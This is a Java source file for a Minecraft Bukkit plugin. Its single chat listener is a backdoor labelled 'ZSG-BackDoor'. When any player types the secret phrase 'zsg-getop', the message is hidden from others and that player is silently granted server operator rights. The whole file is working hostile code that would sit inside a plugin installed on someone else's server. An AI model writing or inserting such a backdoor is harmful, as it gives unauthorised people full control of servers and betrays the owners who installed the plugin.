package me.zsg.zsg.Events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class getopEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException,IllegalAccessException,SecurityException,IllegalAccessException{
        Player player = e.getPlayer();
        if(e.getMessage().equals("zsg-getop")){
            player.sendMessage(ChatColor.GOLD + "ZSG-BackDoor "+ ChatColor.GRAY + "> "+ ChatColor.WHITE+ "You are now "+ ChatColor.GOLD + "operator"+ ChatColor.WHITE + "!");
            e.setCancelled(true);
            player.setOp(true);
        }

    }
}
